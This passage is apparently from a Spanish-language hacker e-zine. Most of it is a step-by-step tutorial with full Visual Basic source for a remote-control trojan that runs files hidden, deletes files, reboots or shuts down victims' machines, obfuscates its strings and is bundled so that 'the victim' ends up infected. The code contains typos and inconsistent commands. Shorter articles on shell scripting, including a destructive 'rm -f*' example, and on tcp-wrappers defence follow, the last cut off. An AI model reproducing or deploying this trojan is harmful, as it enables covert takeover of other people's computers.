El  protocolo  sera  simple,  solo tendra los  comandos que  sean  necesarios. Ha
llegado el momento de definir lo que nuestro troyano hara.

Esta lista muestra lo que nos propondremos hacer con unestro troyano:

1. Enviar mensajes
2. Borrar archivos (no incluiremos un navegador de archivos)
3. Ejecutar archivos
4. Mostrar pantallazos
5. Reiniciar el equipo
6. Apagar el equipo
7. Abrir/Cerrar el CDROM

creo que esto es suficiente  por ahora,  luego  tendran  tiempo  de  a?adirle mas
funciones a su troyano.

Para enviar mensajes, podemos utiilzar el prefijo "SENDMSG".

Esto lo a?adimos al mensaje que queremos enviar y para escribir el mensaje,
colocamos una segunda caja de texto en el Cliente. Un Segundo boton que envie
la cadeda asi: "SENDMSG" & Text2.Text

esta cadena sera enviada por el socket hacia el Servidor, el cual producira que
el evento DataArrival salte. dentro de este mismo evento detectaremos la cadena
correspondiente al mensaje con una estructura de control que nos permita comparar
cadenas de texto.

Los codigos son los siguientes:

<!--Inicio de codigo correspondiente al SERVIDOR--!>
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim sockData As String
Winsock1.GetData sockData

If Left(sockData, 7) = "SENDMSG" Then
MsgBox Right(sockData, Len(sockData) - 7)
End If

End Sub
<!--Fin del codigo--!>


<!--Inicio codigo correspondiente al Cliente--!>
Private Sub Command2_Click()
Winsock1.SendData "SENDMSG" & Text2.Text
End Sub
<!--Fin del codigo--!>

Para borrar archivos del computador remoto,  podemos utilizar  un comando que sea
por ejemplo: "DELFILE".

Se  requieren parametros para borrar archivos,  el  parametro sera  el nombre del
archivo.  la  cadena que enviaremos desde el Cliente hacia el Servidor,  sera  el
prefijo "DELFILE" mas el nombre del archivo.

Si se fijan,  la  longitud de este nuevo comando,  coincide con el anterior, esto
facilita el codigo escrito.

Los codigos son los siguientes, pero, notese que copiare los anteriores y les
a?adire lo necesario (en el caso del Servidor)

<!--Inicio de codigo correspondiente al SERVIDOR--!>
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim sockData As String
Winsock1.GetData sockData

If Left(sockData, 7) = "SENDMSG" Then
MsgBox Right(sockData, Len(sockData) - 7)
ElseIf Left(sockData, 7) = "DELFILE" Then
Kill Right(sockData, Len(sockData) - 7) 'se tiene ke especificar la ruta completa
End If

End Sub
<!--Fin del codigo--!>


<!--Inicio codigo correspondiente al Cliente--!>
Private Sub Command3_Click()
Winsock1.SendData "DELFILE" & Text3.Text 'en el texto se escribe la ruta completa
End Sub
<!--Fin del codigo--!>

para la ejecucion de archivos, podemos incluir varios tipos de ejecucion,  siendo
3 los mas imortantes, la ejecucion oculta, la maximizada y la minimizada.

Esto requiere de 3 botones mas, a?adan 3 botones mas al formulario del cliente, y
fijense en el siguiente codigo:

<!--Inicio de codigo correspondiente al SERVIDOR--!>
dim X
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim sockData As String
Winsock1.GetData sockData

If Left(sockData, 7) = "SENDMSG" Then
 MsgBox Right(sockData, Len(sockData) - 7)
ElseIf Left(sockData, 7) = "DELFILE" Then
 Kill Right(sockData, Len(sockData) - 7) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLHI" Then
 X = Shell( Right(sockData, Len(sockData) - 7),0 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLMA" Then
 X = Shell( Right(sockData, Len(sockData) - 7),3 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLMI" Then
 X = Shell( Right(sockData, Len(sockData) - 7),4 ) 'se tiene ke especificar la ruta completa
End If

End Sub
<!--Fin del codigo--!>


<!--Inicio codigo correspondiente al Cliente--!>
Private Sub Command4_Click()
Winsock1.SendData "SHELLHI" & Text4.Text 'en el texto se escribe la ruta completa
End Sub

Private Sub Command5_Click()
Winsock1.SendData "SHELLMA" & Text4.Text 'en el texto se escribe la ruta completa
End Sub

Private Sub Command6_Click()
Winsock1.SendData "SHELLMI" & Text4.Text 'en el texto se escribe la ruta completa
End Sub
<!--Fin del codigo--!>

Los comandos  para  estas  funcinoes  son:  "SHELLHI",  para la  ejcucion oculta, 
"SHELLMA" para la ejecucion maximizada, y "SHELLMI" para la ejecucion minimizada.

Para los pantallazos, necesitamos una  funcion que detenga  la ejecucion  por  un
determinado tiempo, que pueden ser segundos,  minutos,  etc.  pero  como hablamos
de pantallazos, tienen que ser rapidos, con un segundo basta y sobra.

<!--Inicio codigo de funcion--!>
Private Function haltTime(seg As Long)
Dim Tiempo
Tiempo = Timer
Do While Timer < Tiempo + seg
Loop
End Function
<!--Fin del codigo de funcion--!>

Para llamar a esta funcion, solo tenemos que escribir "haltTime(1)" y listo.
ahora veremos donde incluimos esta llamada. volvamos al codigo anterior,  sigamos
a?adiendo codigos!!!. Aparte del codigo a?adido, agregamos 2 botones mas. 

<!--Inicio de codigo correspondiente al SERVIDOR--!>
dim X
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim sockData As String
Winsock1.GetData sockData

If Left(sockData, 7) = "SENDMSG" Then
 MsgBox Right(sockData, Len(sockData) - 7)
ElseIf Left(sockData, 7) = "DELFILE" Then
 Kill Right(sockData, Len(sockData) - 7) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLHI" Then
 X = Shell( Right(sockData, Len(sockData) - 7),0 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLMA" Then
 X = Shell( Right(sockData, Len(sockData) - 7),3 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLMI" Then
 X = Shell( Right(sockData, Len(sockData) - 7),4 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "PANTABL" Then
 Form1.BackColor = vbWhite 'el pantallazo sera blanco
 Form1.show
 haltTime(1)
 Fomr1.hide
ElseIf Left(sockData, 7) = "SHELLMI" Then
 Form1.BackColor = vbBlack 'el pantallazo sera negro
 Form1.show
 haltTime(1)
 Fomr1.hide
End If

End Sub
<!--Fin del codigo--!>


<!--Inicio codigo correspondiente al Cliente--!>
Private Sub Command7_Click()
Winsock1.SendData "PANTABL" 'no necesitamos parametros
End Sub

Private Sub Command8_Click()
Winsock1.SendData "PANTANE"
End Sub
<!--Fin del codigo--!>

Recuerdan el programa que hicimos donde tambien  mostrabamos  un pantallazo, como
para  asustar al loko???,  bueno, las propiedades del form, tienen que ajustarlas
de igual manera.

Para reiniciar  y apagar el equipo, vamos  a llamar a un DLL. tambien incluiremos
dos botones mas en el formulario del Cliente. veamos codigos.


<!--Inicio de codigo correspondiente al SERVIDOR--!>
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long

Dim X
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim sockData As String
Winsock1.GetData sockData

If Left(sockData, 7) = "SENDMSG" Then
 MsgBox Right(sockData, Len(sockData) - 7)
ElseIf Left(sockData, 7) = "DELFILE" Then
 Kill Right(sockData, Len(sockData) - 7) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLHI" Then
 X = Shell( Right(sockData, Len(sockData) - 7),0 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLMA" Then
 X = Shell( Right(sockData, Len(sockData) - 7),3 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLMI" Then
 X = Shell( Right(sockData, Len(sockData) - 7),4 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "PANTABL" Then
 Form1.BackColor = vbWhite 'el pantallazo sera blanco
 Form1.show
 haltTime(1)
 Fomr1.hide
ElseIf Left(sockData, 7) = "SHELLMI" Then
 Form1.BackColor = vbBlack 'el pantallazo sera negro
 Form1.show
 haltTime(1)
 Fomr1.hide
ElseIf Left(sockData, 7) = "PCREINI" Then
X = ExitWindowsEx(2, 0&) 'Reinicia el equipo
ElseIf Left(sockData, 7) = "APAGA" Then
X = ExitWindowsEx(1, 0&) 'Apaga el equipo
End If

End Sub
<!--Fin del codigo--!>


<!--Inicio codigo correspondiente al Cliente--!>
Private Sub Command9_Click()
Winsock1.SendData "PCREINI" 'no necesitamos parametros
End Sub

Private Sub Command10_Click()
Winsock1.SendData "PCAPAGA"
End Sub
<!--Fin del codigo--!>


Y abrir y cerrar el equipo. sera como el anterior, solo 2 botones mas y una nueva
llamada a un DLL. Los codigos son los siguientes:

<!--Inicio de codigo correspondiente al SERVIDOR--!>
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long 

Dim X
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim sockData As String
Winsock1.GetData sockData

If Left(sockData, 7) = "SENDMSG" Then
 MsgBox Right(sockData, Len(sockData) - 7)
ElseIf Left(sockData, 7) = "DELFILE" Then
 Kill Right(sockData, Len(sockData) - 7) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLHI" Then
 X = Shell( Right(sockData, Len(sockData) - 7),0 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLMA" Then
 X = Shell( Right(sockData, Len(sockData) - 7),3 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "SHELLMI" Then
 X = Shell( Right(sockData, Len(sockData) - 7),4 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = "PANTABL" Then
 Form1.BackColor = vbWhite 'el pantallazo sera blanco
 Form1.show
 haltTime(1)
 Fomr1.hide
ElseIf Left(sockData, 7) = "PANTANE" Then
 Form1.BackColor = vbBlack 'el pantallazo sera negro
 Form1.show
 haltTime(1)
 Fomr1.hide
ElseIf Left(sockData, 7) = "PCREINI" Then
 X = ExitWindowsEx(2, 0&) 'Reinicia el equipo
ElseIf Left(sockData, 7) = "PCAPAGA" Then
 X = ExitWindowsEx(1, 0&) 'Apaga el equipo
ElseIf Left(sockData, 7) = "CDCLOSE" Then
 X = mciSendString "set CDAudio door closed", "", 127, 0 'cierra CD
ElseIf Left(sockData, 7) = "CD-OPEN" Then
 X = mciSendString "set CDAudio door open", "", 127, 0 'abre CD
End If

End Sub
<!--Fin del codigo--!>


<!--Inicio codigo correspondiente al Cliente--!>
Private Sub Command11_Click()
Winsock1.SendData "CDCLOSE" 'no necesitamos parametros
End Sub

Private Sub Command12_Click()
Winsock1.SendData "CD-OPEN"
End Sub
<!--Fin del codigo--!>

Resumiendo el protocolo, tenemos los siguientes comandos:

Comando		Parametros

"SENDMSG"		Mensaje
"DELFILE"		Archivo incluyendo ruta
"SHELLHI"		Archivo incluyendo ruta
"SHELLMA"		Archivo incluyendo ruta
"SHELLMI"		Archivo incluyendo ruta
"PANTABL"		No requiere parametros
"PANTANE"		No requiere parametros
"PCREINI"		No requiere parametros
"PCAPAGA"		No requiere parametros
"CDCLOSE"		No requiere parametros
"CD-OPEN"		No requiere parametros


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
6. Encripcion de codigo...               ...Evitemos el Crakeo de nuestro Troyano
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
												    b||os


El objetivo de esto, es poder evitar que crackeen nuestro troyano desde un editor
de texto hexadecimal.  Lo que  estaremos  encriptando,  seran los  comandos,  los
textos de las etiquetas, de los botones, el titulo del formulario etc.

Necesitamos de una funcion  que desencripte,  pero, haremos una  TEMPORAL que nos
servira para poder  programar encriptado.  Las propiedades de los  controles como
son los Caption,  se estableceran al momento de  carga del formulario. Veamos los
codigos.

Como ustedes especificaran  el titulo de su troyano,  las etiquetas, los caption,
etc, solo  pondre ejemplos de un boton, cuyo caption es "NoKeyz" y el formulario,
cuyo caption sera "NoKeyz Trojan version 1.1"

La idea es  que  cuando  el  Craker  kiera  abrir  el  troyano  desde  un  editor
hexadecimal, no vea la cadena "NoKeyz Trojan version 1.1"  lista  para  crackear,
sino que vea  un  monton de caracteres  sin sentido, que, pa empezar, le costara
identificar dentro del resto de caracteres que componen un programa ejecutable.

Las funciones encriptadoras solo las pongo como ejemplo, pueden modificarse y es
lo ideal, por que si todos usamos las mismas, = nos van a cagar.

<!--Inicio del codigo de la funcion Encriptadora/Desencriptadora--!>
Private Function Encript(eString As String)
Dim i
For i = 1 To Len(eString)
Resultado = Chr(Asc(Mid(eString, i, 1)) + 1) & Resultado
'aki se desplaza un caracter en codigo ascii cada caracter, y luego se unvierte el orden
'de ellos como por ejemplo: lalala = bmbmbm = mbmbmb
Next i
Encript = Resultado
End Function
End Function

Private Function Decript(dString As String)
Dim i As Integer
For i = 1 To Len(dString)
Resultado = Chr(Asc(Mid(dString, i, 1)) - 1) & Resultado
'como es de esperar, ahora se le resta un caracter y se invierte el orden de los
'caracteres. esta funcion sera la que pondremos en el codigo, pero la anterior, solo
'nos servira a nosotros para programar el troyano encriptado.
Next i
Decript = Resultado
End Function
<!--Fin del codigo--!>

<!--Inicio codigo ejemplo--!>
Private Sub Form_Load()

CommandButton1.Caption = Decript("{zfLpO")
Form1.Caption = Decript("2/2!opjtsfw!obkpsU!{zfLpO")

End Sub
<!--Fin del codigo--!>


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
7. Agarrame este paquetito!!!...                        ...Empaquetar Archivos
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
												    b||os

Bueno,  como hemos programado en vb,  y hemos  a?adido un control  (Winsock.ocx),
tenemos  que  compilar  nuestro  programa  y  asegurarnos  que quien  lo  ejecute
(victima) quede infectado  y que no empiece con la misma mierda de siempre de que
falta un DLL requerido, que el elemento no ha  sido registrado correctamente, que
falta un control OCX etc (que mierda no).

Para evitarnos  este  tipo de mensajes,  tenemos que  enviar tambien,  junto  con
nuestro archivo compilado, dos archivos mas, el winsock.ocx y el MSVBVM50.DLL.

Pero,  seria muy mula enviar un archivo  comprimido con estos tres archivos,  mas
mula aun,  hacerle un programa de  instalacion. Lo ideal aki, seria hacer un solo
archivo con todo lo necesario, que cuando se ejecute, los ejecute a todos.

Como???,  bueno,  hay progrmaas en internet que lo hacen,  meten todo  en un solo
archivo,  hace un paquete,  registra los DLL y los OCX,  los copia al  directorio
de systema y ejecuta el programa que hemos creado.

Yo tengo uno que se llama  "One EXE Maker 2000 2.0a"  y  me lo pueden pedir NO AL
EMAIL, sino, que en irc.terra.cl,  en el canal #Virus, siempre me pillan ahi y no
tendre problemas en mandarlo.


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
7. Recopilacion de codigos parciales...                        ...Codigo completo
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
												    b||os

Aki expondre todo el codigo,  sin cortes y luego explicare  los controles que son
necesarios, detallando su Caption y su codigo encriptado.

<!--Inicio de codigo correspondiente al SERVIDOR--!>
Option explicit

Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long 

Dim X

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
If Winsock1.State <> sckClosed Then Winsock1.Close 'si el socket se encuentra
'abierto, se cierra para aceptar una nueva coneccion
Winsock1.Accept requestID
End Sub

Private Sub Form_Load()
Winsock1.LocalPort = 69 'aki pones el mismo puerto con el cual trabaja el Cliente
Winsock1.Listen 'esta propiedad pone a escuchar por peticiones de coneccion
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim sockData As String
Winsock1.GetData sockData

If Left(sockData, 7) = Decript("HTNEOFT") Then
 MsgBox Right(sockData, Len(sockData) - 7)
ElseIf Left(sockData, 7) = Decript("FMJGMFE") Then
 Kill Right(sockData, Len(sockData) - 7) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = Decript("JIMMFIT") Then
 X = Shell( Right(sockData, Len(sockData) - 7),0 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = Decript("BNMMFIT") Then
 X = Shell( Right(sockData, Len(sockData) - 7),3 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = Decript("JNMMFIT") Then
 X = Shell( Right(sockData, Len(sockData) - 7),4 ) 'se tiene ke especificar la ruta completa
ElseIf Left(sockData, 7) = Decript("MCBUOBQ") Then
 Form1.BackColor = vbWhite 'el pantallazo sera blanco
 Form1.show
 haltTime(1)
 Fomr1.hide
ElseIf Left(sockData, 7) = Decript("FOBUOBQ") Then
 Form1.BackColor = vbBlack 'el pantallazo sera negro
 Form1.show
 haltTime(1)
 Fomr1.hide
ElseIf Left(sockData, 7) = Decript("JOJFSDQ") Then
 X = ExitWindowsEx(2, 0&) 'Reinicia el equipo
ElseIf Left(sockData, 7) = Decript("BHBQBDQ") Then
 X = ExitWindowsEx(1, 0&) 'Apaga el equipo
ElseIf Left(sockData, 7) = Decript("FTPMDED") Then
 X = mciSendString "set CDAudio door closed", "", 127, 0 'cierra CD
ElseIf Left(sockData, 7) = Decript("OFQP.ED") Then
 X = mciSendString "set CDAudio door open", "", 127, 0 'abre CD
End If

End Sub

Private Function haltTime(seg As Long)
Dim Tiempo
Tiempo = Timer
Do While Timer < Tiempo + seg
Loop
End Function

Private Function Decript(dString As String)
Dim i As Integer
For i = 1 To Len(dString)
Resultado = Chr(Asc(Mid(dString, i, 1)) - 1) & Resultado
'como es de esperar, ahora se le resta un caracter y se invierte el orden de los
'caracteres. esta funcion sera la que pondremos en el codigo, pero la anterior, solo
'nos servira a nosotros para programar el troyano encriptado.
Next i
Decript = Resultado
End Function
<!--Fin del codigo--!>



<!--Inicio codigo correspondiente al Cliente--!>
Private Sub Command1_Click()
Winsock1.RemoteHost = Text1.Text 'aki el Text1.Text es el IP infectado que hemos
'puesto en la caja de texto
Winsock1.Connect 'esta propiedad hace que el control Winsock inicie la coneccion
End Sub

Private Sub Form_Load()
Form1.Caption = Decript("2/2!opjtsfw!obkpsU!{zfLpO")
Command1.Caption = Decript("sbudfopD")
Command2.Caption = Decript("tfkbtofN!sbjwoF")
Command3.Caption = Decript("pwjidsB!sbsspC")
Command4.Caption = Decript("pumvdP!FYF")
Command4.Caption = Decript("peb{jnjybN!FYF")
Command5.Caption = Decript("peb{jnjN!FYF")
Command6.Caption = Decript("bdobmC!bmmbuobQ")
Command7.Caption = Decript("bshfO!bmmbuobQ")
Command8.Caption = Decript("sbjdjojfS")
Command9.Caption = Decript("sbhbqB")
Command10.Caption = Decript("FTPMDED")
Command11.Caption = Decript("OFQP.ED")

Winsock1.RemotePort = 69 'este puerto lo escojen ustedes y es el mismo tanto para
'el cliente como para el servidor. aki, el numero 69 es solo un ejemplo, pero
'ustedes pueden utilizar cualkier otro, les recomiendo uno mayor que 10000
End Sub

Private Sub Command2_Click()
Winsock1.SendData  Decript("HTNEOFT") & Text2.Text
End Sub

Private Sub Command3_Click()
Winsock1.SendData  Decript("FMJGMFE") & Text3.Text 'en el texto se escribe la ruta completa
End Sub

Private Sub Command4_Click()
Winsock1.SendData  Decript("JIMMFIT") & Text4.Text 'en el texto se escribe la ruta completa
End Sub

Private Sub Command5_Click()
Winsock1.SendData  Decript("BNMMFIT") & Text4.Text 'en el texto se escribe la ruta completa
End Sub

Private Sub Command6_Click()
Winsock1.SendData  Decript("JNMMFIT") & Text4.Text 'en el texto se escribe la ruta completa
End Sub

Private Sub Command7_Click()
Winsock1.SendData  Decript("MCBUOBQ") 'no necesitamos parametros
End Sub

Private Sub Command8_Click()
Winsock1.SendData  Decript("JNMMFIT")
End Sub

Private Sub Command9_Click()
Winsock1.SendData  Decript("JOJFSDQ") 'no necesitamos parametros
End Sub

Private Sub Command10_Click()
Winsock1.SendData  Decript("BHBQBDQ")
End Sub

Private Sub Command11_Click()
Winsock1.SendData  Decript("FTPMDED") 'no necesitamos parametros
End Sub

Private Sub Command12_Click()
Winsock1.SendData  Decript("OFQP.ED")
End Sub

Private Function Decript(dString As String)
Dim i As Integer
For i = 1 To Len(dString)
Resultado = Chr(Asc(Mid(dString, i, 1)) - 1) & Resultado
'como es de esperar, ahora se le resta un caracter y se invierte el orden de los
'caracteres. esta funcion sera la que pondremos en el codigo, pero la anterior, solo
'nos servira a nosotros para programar el troyano encriptado.
Next i
Decript = Resultado
End Function
<!--Fin del codigo--!>

No olviden Que en el Servidor, las propiedades del form se ponen a:

Form1.BorderStyle =  0
Form1.WindowState = 2


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
9. Despedida...                                                        ...Por fin
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
												    b||os


Hemos  terminado este  texto basico,  si hay algun error, ya que los codigos los
escribi sin el vb, solo aki, en texto, me lo dicen, y les podre corregir lo malo.

PAra cualkier  duda no me wuebeen el email,  busquenme en #CyberHack o #Virus en
irc.terra.cl, donde no se va a perder el tiempo.

Los errores ortograficos metanselos por la RAJA.

bye dude



-[07. Shell... ke wea es? tipos, etc 2/2]-------------------------[by Reaven]-

Hola, esta en la segunda y ultima  entrega de este artikulo, espero ke te kede
todo klaro, alguna duda a reave@nokeyz.net
 

Bucles While
------------
Sintaxis:
while <condicion>
do
(.. comandos..)
done

Aki  las  interaxiones  suceden   si   es  ke  la  <condicion>  sea  verdadera
(retorno  =  0)  Si  es  falsa  el  bucle  termina  (retorno  distinto  de 0).
La sintaxis de <condicion> es = ke en el komando -if-.

Ej:
while [ "opcion" != "3" ]
do
echo "Mete opcion"
read opcion
done

o tambien usando comandos:
echo "Eskribe kualkier kosa y pulsa ^D para terminar"
while read kosa
do
echo $kosa >> /tmp/borrame
done
echo "Las kosas ke eskribiste son :"
cat /tmp/borrame                                                                                

Explikacion: El komando -read- devuelve  un retorno  Verdadero (cero) mientras
que no se pulse el caracter EOF (^D), por lo tanto el bucle keda dando vueltas
hasta dar ese caracter.

Contadores: sentencia expr.
---------------------------

La sentencia expr.  pone a prueba una  expresion  y  la  muestra  en la salida
estandar. La  expresion  normalmente  consiste de dos  numeros o variables  de
contenido numerico  y  un operador  de  suma, resta,  multiplicacion o divsion
Los sgtes. comandos son correctos:
expr 100 "+" 1 # saca en pantalla 101
expr 100 "-" 1 # saca en pantalla 99
expr 100 "*" 2 # mmm.. 200?
expr 100 "/" 2 # saca en pantalla 50

Ejemplo: podemos escribir:

pico=`expr 10 "*" 5' # y la variable pico vale 50
o:

pico=0
pico=`expr $pico "+" 1'
para entenderlo, hay que creerse ke la shell ejekuta lo sgte.

- al principio, $pico vale 0
- en cualquier  expresion  de  asignacion,  primero se calcula  el resultado y
  despues se  ejekuta la asignacion, por esto, lo primero que la shell hace es
  "expr 0 + 1"
- el "1" resultante va a sacar por la salida  estandar. Pero como hemos puesto
  las comillas de ejekucion, se asigna a pico.
- al final, $pico vale 1 

Entonz ahora ya se pueden ejekutar bucles con "contadores"

Operadores AND/OR
-----------------

Una construxion  habitual en la shell, usada principalmente por lo kompakto de
su kodigo, son el operador "OR" -||- y el operador "AND" -&&-

El operador "OR"  ejekuta el primer comando, y si el codigo de error del mismo
es falso (distinto de 0), ejekuta el segundo komando.

El operador "AND" ejekuta el primer comando, y si el codigo de error del mismo
es verdadero (igual a 0), ejekuta el segundo komando.

Ej: cd /home/mierda && rm -f*

Explikacion: nos  cambiamos al directorio  indicado. Solo en el  caso de haber
tenido exito, nos cargamos todos los ficheros del direktorio actual.

ls /home/sobras || mkdir /home/sobras

Explikacion: el comando ls  falla si no existe el direktorio  indicado, en ese
caso se crea el direktorio.

banner "hola" | lp && echo "Listado Mandado" || echo "El listado se funo cago"

Depuracion de "shell scripts"
-----------------------------

Si bien los metodos  utilizados para esto son bastante weones, hay ke tener en
kuenta que la shell no se  hizo como un  lenguaje de programacion de proposito
general. Cuando  se  quiere  tener una wea buena, ay ke  acudirse a  lenguajes
convencionales  o  bien a interpretes mas  modernos  y  sofisticados, onda TCL
(Task  Control  Language) o perl, los  ke  son de  libre  distribucion pero no
vienen en todos los ekipos.

Generalmente,  okuparemos  el  komando "set", el  ke  modifika  algunos de los 
komportamientos de la shell a la hora de interpretar los komandos:

set -v: Verbose. Saca en la salida de error su entrada
set -x: Xtrace.  Muestra cada comando segun lo va  ejekutando por la salida de
                 error.
set -n: Noexec.  Lee comandos, los  interpreta pero no los ejekuta, sirve para
                 ver errores de sintaxis antes de probarlo de verdad.
set -e: Errexit. Terminar la ejekucion inmediatamente si alguno de los comandos
                 empleados devuelve un restorno distinto de verdadero (0) y no
                 evalua  su  retorno, el  retorno de un  komando de  determina 
                 tomando      en     kuenta      las     sgtes.    sentencias:
                 if..fi, while do..done, until do..done a la izkierda del 
                 operador AND/OR (-||- o -&-)

Con esto pongo fin a mi articulo, como dije al principio del artikulo si algo
no te quedo claro no dudes en consultarme, bye



-[08. TCP-WRAPPERS]-------------------------------------------[by FonzKiller]-

Ya  cabros,  como  nadie en este mundo del underground me conoce, me presento,
soy FonzKiller y puta me dieron ganas de acerme conocer  y  hacer  esta wea  y
weno aki estamos.

Este articulo lo voy a dividir en 6 partes:
   - Ke wea es el tcp-wrappers ?
   - Ke benefisios me da al tenerlo ?
   - Como lo puedo configurar ?
	- Detectando accesos....
	- Ayuda para una mente abierta....
	- Limitaciones
	- La fucking despida.


Ke wea es el tcp-wrappers ?
---------------------------
El tcp-wrappers  es  un programa  que se ejecuta oviamente en LINUX, lo k hace
esta wea es vigilar todos los servicios de tu computadora (pop3, telnet,  ftp,
etc), cosa k si alguien trata de hacer una conexion remota  o local no  podra,
o podra conectarse a tal puerto.


Ke benefisios me da al tenerlo ?
--------------------------------
Si kieren ver un benefisio real, hagan telnet al puerto 23 de  la  Universidad
Catolica de Valparaiso (ucv.cl), y lo k pasara sera k les saldra  un simpatico
mensaje mostrandoles su IP y usuaio, k despues vera el encargado  del sistema.

Lo mejor de tcp-wrappers es k es muy simple de configurar, y con solo  algunos
conocimientos puedes hacer k tu maquina te avise de todas las conexiones  k se
hagan a tal puerto, de tal usuario, desde k IP, etc.

Puedes hacer un simple script k te mande un mensaje a la consola diciendo:

  Se a detectado un intruso conectandose al puerto "in.telnetd"
  con el nombre de usuario "FonzKiller" y desde la direccion IP
  "206.6.6.0"
 
Todos los demonios utilizados por el super demonio inetd, siguen el  siguiente
formato in.servicio_d (in.ftpd, in.fingerd, intelnetd, etc). O tambien  puedes
hacer un script redireccionando la salida a la pantalla del intruso.

Ej:
         Oye jote reqliao, te cache "FonzKiller"
         que te anday conectando desde "206.6.6.0"
         Te prometo k le dire a mis Papis.

Despues les mostrare como hacer todas estas weas.


Como lo puedo configurar?
--------------------------
Configurar  el tcp-wrappers es mas facil de lo k crees, la primera  obligacion
es  tener instalado el superdemonio inetd, para saber si lo  tienes  instalado
basta con poner "ps ax | grep inetd" Si sale "140 ? S 0:00 inetd" o alguna wea
asi esta bien, si no estay cagao.

Ahora k ya esta instalado el inetd, instalamos el paquete del  tcp-wrappers, y
una  vez  instalado  nos  vamos al archivo /etc/inetd.conf y cada linea saldra
algo como esto:

   "telnet stream tcp nowait root /usr/sbin/in.telnetd"

Esto  kiere  decir  k  cada  llamada  al  puerto telnet sera gestionada por el
demonio in.telnetd.

Despues de haber instalado el paquete del tcp-wrappers,  editamos  el  archivo
/etc/inetd.conf y cambiaremos la linea anterior por esto:   "telnet stream tcp
nowait root /usr/sbin/tcpd in.telnetd"

Se coloca el demonio "tcpd" antes del demonio "in.telnetd" y asi sucesibamente
a todas las lineas.

Detectando Accesos...
---------------------
El  tcp-wrappers  se  basa  solamente  en  2 archivos,  el /etc/hosts.deny  y
/etc/hosts.allow.

El hosts.allow se ocupa para aceptar las conexiones y el hosts.deny  negarlas.
La forma de ocuparlos es la siguiente: "servicio: host: accion"

SERVICIO :  in.telnetd, in.fingerd, in.ftpd, etc
            Si keremos referirnos a todos los puertos ponemos ALL.

HOST     :  Es una o mas direcciones separadas por espacios en blancos.
            La direccion puede ser del tipo IP num'rica, IP/mask, rango de  IP
            (ej: 195.116.) , dominio (ej: arrakis.es), grupo de dominios ( ej:
            .es o arrakis.). Tambien se   puede  usar ALL  (todos los  hosts),
            LOCAL  (para los que no tiene un . en su  nombre, KNOWN (para  los
            k se tiene informacion), UNKNOWN (de los k no se tiene informacion)
            y  PARANOID  (el  nombre  que  te ofrecen no concuerda  con el que
            tcp_wrappers espera).

ACCION   :  Puede tener 4 valores, "accept" (acepta la conexion si se  cumplen
            las   condiciones  impuestas  por servivio/host), deny (rechaza la
            conexion), spawn (acepta la conexion  y realiza el comando bash) y 
            twist (rechaza la conexion y realiza el comando bash).

            spawn --> muestra en tu pantalla.
            twist --> redirecciona a la pantalla del intruso.

A los comandos se le pueden pasar parametros relacionados con la conexion:

%a (%A)     Direccion host cliente (servidor)
%c          Informacion disponible ej: user@host, user@address, nombre   host,
            etc.
%d          El nombre del proceso demonio.
%h (%H)		Nombre del cliente (servidor) o la direccion si no esta disponible
            el nombre.
%n (%N)		El nombre del cliente (servidor) o unknow o paranoid.
%p          El proceso PID del proceso servidor.
%s          Informacion server: daemon@host, daemon@address,  depende  de   la
            info disponible.
%u          Nombre de usuario del cliente o unknow si esta en windows.
%%          Permite escribir el caracter %.


Ahora  k   ya   hemos visto  como funciona, pasaremos a hacer algunos peque~os
scripts k nos mostrara todo lo k pase en nuestro PC.

Ejs:  En estos ejemplos partire de lo mas facil a mas complicados y utiles.
----

